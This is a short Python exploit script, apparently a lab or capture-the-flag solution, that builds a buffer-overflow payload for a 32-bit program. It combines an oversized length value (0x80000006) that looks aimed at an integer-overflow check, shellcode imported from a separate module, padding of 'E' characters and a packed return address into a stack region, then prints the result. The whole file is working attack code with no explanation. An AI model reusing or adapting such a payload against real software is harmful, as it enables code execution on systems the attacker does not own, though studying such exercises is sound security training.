from struct import pack
from shellcode import shellcode


addr = pack("<I", 0xbffeb860 - 0x6)

takeoff = pack("<I", 0x80000006)
offset = "E" * 0x45
print(takeoff + shellcode + offset + addr)
